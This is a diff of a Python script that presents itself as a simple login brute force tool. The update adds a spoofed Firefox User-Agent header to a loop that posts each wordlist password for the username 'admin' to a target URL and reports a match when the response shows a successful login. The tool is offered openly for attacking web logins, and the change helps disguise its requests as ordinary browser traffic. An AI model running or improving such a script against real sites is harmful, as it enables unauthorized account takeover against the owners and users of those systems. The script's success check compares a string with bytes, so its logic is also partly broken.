@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # Author: @haithamaouati
-# Version:1.0
+# Version:1.1
 
 import argparse
 import colorama
@@ -26,7 +26,7 @@ print('''\
               \________/
 ''')
 
-print(' Author: ' + Fore.CYAN + '@haithamaouati' + Fore.WHITE + ' Version: ' + Fore.YELLOW + '1.0\n' + Fore.WHITE)
+print(' Author: ' + Fore.CYAN + '@haithamaouati' + Fore.WHITE + ' Version: ' + Fore.YELLOW + '1.1\n' + Fore.WHITE)
 print(' A simple login brute force tool\n')
 
 parser = argparse.ArgumentParser()
@@ -47,11 +47,13 @@ username = args.username
 password = args.password
 submit = args.submit
 
+headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
+
 arq = open(wordlist,'r').readlines()
 
 for line in arq:
   pswd = line.strip()
-  http = requests.post(url, data={username:'admin',password:pswd,'submit':submit})
+  http = requests.post(url, data={username:'admin',password:pswd,'submit':submit} , headers=headers)
   content = http.content
   if 'Logged in success' in content:
     print(Fore.GREEN + '[+] Password found: ' + Fore.WHITE + pswd)
